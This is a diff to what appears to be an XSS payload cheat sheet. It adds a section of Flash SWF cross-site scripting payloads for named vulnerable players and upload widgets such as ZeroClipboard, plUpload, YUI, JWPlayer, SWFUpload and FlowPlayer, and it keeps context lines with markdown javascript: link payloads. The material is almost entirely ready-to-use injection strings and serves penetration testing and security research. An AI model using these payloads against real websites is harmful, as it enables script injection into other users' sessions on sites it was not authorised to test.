@@ -110,6 +110,34 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 [a](javascript:window.onerror=confirm;throw%201)
 ```
 
+**Flash SWF XSS**
+
+- ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`
+
+- plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`
+
+- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)
+
+- FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>
+
+- videoJS: `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`
+
+- YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`
+
+- YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`
+
+- Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`
+
+- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`
+
+- JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`
+
+- SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`
+
+- FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`
+
+_Note: Useful reference on SWF XSS construction from [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._
+
 **Lightweight Markup Languages**
 
 **RubyDoc** (.rdoc)
